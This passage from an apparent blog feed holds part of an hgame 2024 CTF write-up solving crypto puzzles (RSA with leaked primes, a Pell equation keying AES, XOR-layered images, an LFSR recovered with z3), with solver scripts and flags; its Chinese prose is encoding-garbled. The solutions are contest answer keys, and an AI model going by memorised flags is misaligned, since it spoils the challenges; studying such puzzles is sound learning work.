class="string">c=10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>ç”±è´¹é©¬å°å®šç†ï¼Œå¯ä»¥çŸ¥é“<code>leak1</code>å’Œ<code>leak2</code>åˆ†åˆ«æ˜¯<code>q</code>å’Œ<code>p</code>ï¼Œç›´æ¥ä»£è¿›å»ç®—å³å¯ã€‚</p><p>æ›´å…·ä½“çš„è®²è§£å‚è€ƒè¿™ä¸ªè§†é¢‘ï¼š<a href="https://www.bilibili.com/video/BV1Sh41177Rm/?vd_source=abef91c9524f8373b84bcdb481407372">ã€CTF-åŠ å¯†ã€‘RSAä¹‹leak&#x3D;p^q%n+q^p%n</a></p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">q=<span class="number">149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span></span><br><span class="line">p=<span class="number">116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span></span><br><span class="line">c=<span class="number">10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;F3rmat_l1tt1e_the0rem_is_th3_bas1s&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ezMath"><a href="#ezMath" class="headerlink" title="ezMath"></a>ezMath</h2><p>ä½©å°”æ–¹ç¨‹æ±‚è§£</p><p>å‚è€ƒè¿™ä¸ªæ–‡ç« ï¼š<a href="https://blog.csdn.net/acdreamers/article/details/8529686">è¿åˆ†æ•°æ±‚è§£Pellæ–¹ç¨‹</a></p><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,y,x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">KEY</span>):</span><br><span class="line">    cipher= AES.new(KEY,AES.MODE_ECB)</span><br><span class="line">    encrypted =cipher.encrypt(flag)</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line">D = <span class="number">114514</span></span><br><span class="line"><span class="keyword">assert</span> x**<span class="number">2</span> - D * y**<span class="number">2</span> == <span class="number">1</span></span><br><span class="line">flag=pad(flag)</span><br><span class="line">key=pad(long_to_bytes(y))[:<span class="number">16</span>]</span><br><span class="line">enc=encrypt(key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc=<span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#enc=b&quot;\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5&#x27;\x93\xf8\xde\xb2\x9a\x9a&quot;</span></span><br></pre></td></tr></table></figure><p>å…ˆç”¨javaæ±‚å‡º <code>x</code> å’Œ <code>y</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">solve</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">    &#123;</span><br><span class="line">        BigInteger N, p1, p2, q1, q2, a0, a1, a2, g1, g2, h1, h2,p,q;</span><br><span class="line">        g1 = q2 = p1 = BigInteger.ZERO;</span><br><span class="line">        h1 = q1 = p2 = BigInteger.ONE;</span><br><span class="line">        a0 = a1 = BigInteger.valueOf((<span class="type">int</span>)Math.sqrt(<span class="number">1.0</span>*n));</span><br><span class="line">        BigInteger ans=a0.multiply(a0);</span><br><span class="line">        <span class="keyword">if</span>(ans.equals(BigInteger.valueOf(n)))</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;No solution!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        N = BigInteger.valueOf(n);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            g2 = a1.multiply(h1).subtract(g1);</span><br><span class="line">            h2 = N.subtract(g2.pow(<span class="number">2</span>)).divide(h1);</span><br><span class="line">            a2 = g2.add(a0).divide(h2);</span><br><span class="line">            p = a1.multiply(p2).add(p1);</span><br><span class="line">            q = a1.multiply(q2).add(q1);</span><br><span class="line">            <span class="keyword">if</span> (p.pow(<span class="number">2</span>).subtract(N.multiply(q.pow(<span class="number">2</span>))).compareTo(BigInteger.ONE) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            g1 = g2;h1 = h2;a1 = a2;</span><br><span class="line">            p1 = p2;p2 = p;</span><br><span class="line">            q1 = q2;q2 = q;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;x = &quot;</span>+p+<span class="string">&quot;\ny = &quot;</span>+q);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cin</span> <span class="operator">=</span> <span class="number">114514</span>;</span><br><span class="line">        solve(cin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">x = 3058389164815894335086675882217709431950420307140756009821362546111334285928768064662409120517323199</span></span><br><span class="line"><span class="comment">y = 9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>æ¥ç€å¸¦å…¥pythonä¸­è§£aes</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">x = <span class="number">3058389164815894335086675882217709431950420307140756009821362546111334285928768064662409120517323199</span></span><br><span class="line">y = <span class="number">9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680</span></span><br><span class="line"></span><br><span class="line">enc=<span class="string">b&quot;\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5&#x27;\x93\xf8\xde\xb2\x9a\x9a&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">KEY</span>):</span><br><span class="line">    cipher= AES.new(KEY,AES.MODE_ECB)</span><br><span class="line">    decrypted =cipher.decrypt(enc)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">key=pad(long_to_bytes(y))[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">flag=decrypt(key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;G0od!_Yo3_k1ow_C0ntinued_Fra3ti0ns!!!!!!!&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="å¥‡æ€ªçš„å›¾ç‰‡"><a href="#å¥‡æ€ªçš„å›¾ç‰‡" class="headerlink" title="å¥‡æ€ªçš„å›¾ç‰‡"></a>å¥‡æ€ªçš„å›¾ç‰‡</h2><p>æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;hgame&#123;fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_image</span>(<span class="params">width, height</span>):</span><br><span class="line">    image = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    pixels = image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            red = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            green = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            blue = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            pixels[x, y] = (red, green, blue)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_text</span>(<span class="params">image, width, height, token</span>):</span><br><span class="line">    font_size = random.randint(<span class="number">16</span>, <span class="number">40</span>)</span><br><span class="line">    font = ImageFont.truetype(<span class="string">&quot;arial.ttf&quot;</span>, font_size)</span><br><span class="line">    text_color = (random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    x = random.randint(<span class="number">0</span>, width - font_size * <span class="built_in">len</span>(token))</span><br><span class="line">    y = random.randint(<span class="number">0</span>, height - font_size)</span><br><span class="line">    draw = ImageDraw.Draw(image)</span><br><span class="line">    draw.text((x, y), token, font=font, fill=text_color)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_unique_strings</span>(<span class="params">n, length</span>):</span><br><span class="line">    unique_strings = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(unique_strings) &lt; n:</span><br><span class="line">        random_string = secrets.token_hex(length // <span class="number">2</span>)</span><br><span class="line">        unique_strings.add(random_string)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(unique_strings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">random_strings = generate_unique_strings(<span class="built_in">len</span>(flag), <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_image = generate_random_image(<span class="number">120</span>, <span class="number">80</span>)</span><br><span class="line">key_image = generate_random_image(<span class="number">120</span>, <span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_time</span>(<span class="params">image, name</span>):</span><br><span class="line">    time.sleep(random.random())</span><br><span class="line">    image.save(<span class="string">&quot;.\\png_out\\&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    current_image = draw_text(current_image, <span class="number">120</span>, <span class="number">80</span>, flag[i])</span><br><span class="line">    threading.Thread(target=random_time, args=(xor_images(current_image, key_image), random_strings[i])).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“flagæ˜¯ä¸æ–­è¿½åŠ åœ¨ç”»å¸ƒ<code>current_image</code>ä¸Šçš„ï¼Œæ¯æ¬¡è¿½åŠ å®Œéƒ½ä¼šå’Œ<code>key_image</code>å¼‚æˆ–åè¾“å‡ºä¸€å¼ å›¾ç‰‡ã€‚</p><p>åªè¦ç¡®å®š <code>i-1</code> å’Œ <code>i</code>ï¼Œå®ƒä»¬ç›¸äº’å¼‚æˆ–ï¼Œå°±èƒ½å¾—åˆ° <code>flag[i]</code> å­—ç¬¦</p><p>å…ˆæŠŠæ‰€æœ‰æƒ…å†µéƒ½å¼‚æˆ–å‡ºæ¥ï¼Œç„¶åå•ç‹¬æ”¾ä¸€ä¸ªæ–‡ä»¶å¤¹ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">base_dir = <span class="string">&#x27;./png_out&#x27;</span></span><br><span class="line"></span><br><span class="line">files = [file <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(base_dir)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(files)):</span><br><span class="line">    os.makedirs(<span class="string">f&#x27;./img/<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;files[i].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(files)):</span><br><span class="line">        img = xor_images(Image.<span class="built_in">open</span>(<span class="string">f&quot;./png_out/<span class="subst">&#123;files[i]&#125;</span>&quot;</span>),Image.<span class="built_in">open</span>(<span class="string">f&quot;./png_out/<span class="subst">&#123;files[j]&#125;</span>&quot;</span>))</span><br><span class="line">        img.save(<span class="string">f&#x27;./img/<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;files[i].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]&#125;</span>/<span class="subst">&#123;files[j]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶å¤¹ï¼ŒæŒ‰ç…§å¤§å°å‡åºæ’åºï¼Œå¯ä»¥åœ¨<code>9_5c55dc77</code>æ–‡ä»¶å¤¹ä¸‹çœ‹åˆ°è¿™ä¸ªæƒ…å†µã€‚</p><p><img src="/./hgame2024_week1/c_3_1.png"></p><p>ç”±æ­¤å¯ä»¥ç¡®å®š<code>5c55dc77.png</code>å¯¹åº”ç€ <code>flag[0]</code> çš„<code>h</code>ï¼Œå†å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹å•ç‹¬å¤„ç†ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_dir = <span class="string">&#x27;./9_5c55dc77&#x27;</span></span><br><span class="line"></span><br><span class="line">files = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(base_dir):</span><br><span class="line">    imgSize = os.stat(<span class="string">&#x27;./9_5c55dc77/&#x27;</span>+file).st_size</span><br><span class="line">    files[file]=imgSize</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ®å¤§å°æ’åº</span></span><br><span class="line">sort_files = <span class="built_in">sorted</span>(files.items(),key = <span class="keyword">lambda</span> d:d[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(sort_files)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sort_files)-<span class="number">1</span>):</span><br><span class="line">    img1 = sort_files[i][<span class="number">0</span>]</span><br><span class="line">    img2 = sort_files[i+<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    img = xor_images(Image.<span class="built_in">open</span>(<span class="string">&#x27;./9_5c55dc77/&#x27;</span>+img1),Image.<span class="built_in">open</span>(<span class="string">&#x27;./9_5c55dc77/&#x27;</span>+img2))</span><br><span class="line">    img.save(<span class="string">f&#x27;./new_img/<span class="subst">&#123;<span class="built_in">str</span>(i)&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥åœ¨<code>new_img</code>æ–‡ä»¶å¤¹ä¸‹çœ‹åˆ°flagã€‚</p><p><img src="/./hgame2024_week1/c_3_2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;1adf_17eb_803c&#125;</span><br></pre></td></tr></table></figure><h2 id="ezPRNG"><a href="#ezPRNG" class="headerlink" title="ezPRNG"></a>ezPRNG</h2><p>ç”¨z3æ±‚è§£å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">output=[<span class="string">&#x27;1111110110111011110000101011010001000111111001111110100101000011110111111100010000111110110111100001001000101101011110111100010010100000011111101101110101011010111000000011110000100011101111011011000100101100110100101110001010001101101110000010001000111100101010010110110111101110011011001011111011010101011000011011000111011011111001101010111100101100110001011010010101110011101001100111000011110111000001101110000001111100000100000101111100010110111001110011010000011011110110011000001101011111111010110011010111010101001000010011110110011110110101011110111010011010010110111111010011101000110101111101111000110011111110010110000100100100101101010101110010101001101010101011110111010011101110000100101111010110101111110001111111110010000000001110011100100001011111110100111011000101001101001110010010001100011000001101000111010010000101101111101011000000101000001110001011001010010001000011000000100010010010010111010011111111011100100100100101111111001110000111110110001111001111100101001001100010&#x27;</span>, <span class="string">&#x27;0010000000001010111100001100011101111101111000100100111010101110010110011001011110101100011101010000001100000110000000011000000110101111111011100100110111011010000100011111000111001000101001110010110010001000110010101011110011101000011111101101011000011110001101011111000110111000011000110011100100101100111100000100100101111001011101110001011011111111011010100010111011000010010101110110100000110100000100010101000010111101001000011000000000111010010101010111101101011111011001000101000100011001100101010110110001010010001010110111011011111101011100111001101111111111010011101111010010011110011111110100110011111110110001000111100010111000101111000011011011111101110101110100111000011100001010110111100011001011010011010111000110101100110100011101101011101000111011000100110110001100110101010110010011011110000111110100111101110000100010000111100010111000010000010001111110110100001000110110100100110110010110111010011111101011110000011101010100110101011110000110101110111011010110110000010000110001&#x27;</span>, <span class="string">&#x27;1110110110010001011100111110111110111001111101010011001111100100001000111001101011010100010111110101110101111010111100101100010011001001011101000101011000110111000010000101001000100111010110001010000111110110111000011001100010001101000010001111111100000101111000100101000000001001001001101110000100111001110001001011010111111010111101101101001110111010111110110011001000010001010100010010110110101011100000101111100100110011110001001001111100101111001111011011010111001001111010001100110001100001100000110000011111010100101111000000101011111010000111110000101111100010000010010111010110100101010101001111100101011100011001001011000101010101001101100010110000010001110011110011100111000110101010111010011010000001100001011000011101101000000011111000101111101011110011000011011000100100110111010011001111101100101100011000101001110101111001000010110010111101110110010101101000000101001011000000001110001110000100000001001111100011010011000000011011101111101001111110001011101100000010001001010011000001&#x27;</span>, <span class="string">&#x27;0001101010101010100001001001100010000101010100001010001000100011101100110001001100001001110000110100010101111010110111001101011011101110000011001000100100101000011011101000111001001010011100010001010110111011100100111110111001010010111010100000100111110101110010010110100001000010010001101111001110100010001011101100111011101011101100100101011010101000101001000101110011011111110110011111111100000000011100000010011000110001000110101010001011000010101000110000101001110101010111011010010111011001010011100010101001100110000110101100010000100110101110100001101001011011110011100110011001010110100101010111110110111100000111010001111101110000000000111011011101000011001010010111001110111000100111011110100101000100011011101100011111000101110110110111111001111000000011100011000010000101001011001101110101000010101001000100110010000101001111100101000001011011010011110001101000001101111010100101001100010100000111000011110101010100011011001110001011110111010111011010101101100000110000001010010101111011&#x27;</span>]</span><br><span class="line"></span><br><span class="line">mask=<span class="number">0b10001001000010000100010010001001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PRNG</span>(<span class="params">R,mask</span>):</span><br><span class="line">    nextR = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    nextbit=<span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        nextbit ^= (i%<span class="number">2</span>)</span><br><span class="line">        i = i&gt;&gt;<span class="number">1</span></span><br><span class="line">    nextR^=nextbit </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (nextR,nextbit)</span><br><span class="line">    </span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    R = BitVec(<span class="string">&#x27;R&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    s = Solver()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        (R,nextbit)=PRNG(R,mask)</span><br><span class="line">        s.add(nextbit==output[k][i])</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">        res = s.model()</span><br><span class="line">        m = <span class="built_in">str</span>(res)[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">        flag+=<span class="built_in">hex</span>(<span class="built_in">int</span>(m))[<span class="number">2</span>:]</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">hgame = <span class="string">&#x27;hgame&#123;&#x27;</span>+flag[:<span class="number">8</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">8</span>:<span class="number">12</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">12</span>:<span class="number">16</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">16</span>:<span class="number">20</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">20</span>:]+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(hgame)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fbbbee823f434f919337907880e4191a</span></span><br><span class="line"><span class="comment"># hgame&#123;fbbbee82-3f43-4f91-9337-907880e4191a&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> MISC </tag>
            
            <tag> CRYPTO </tag>
            
            <tag> PWN </tag>
            
            <tag> REVERSE </tag>
            
            <tag> hgame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeginCTF WP</title>
      <link href="/BeginCTF/"/>
      <url>/BeginCTF/</url>
      
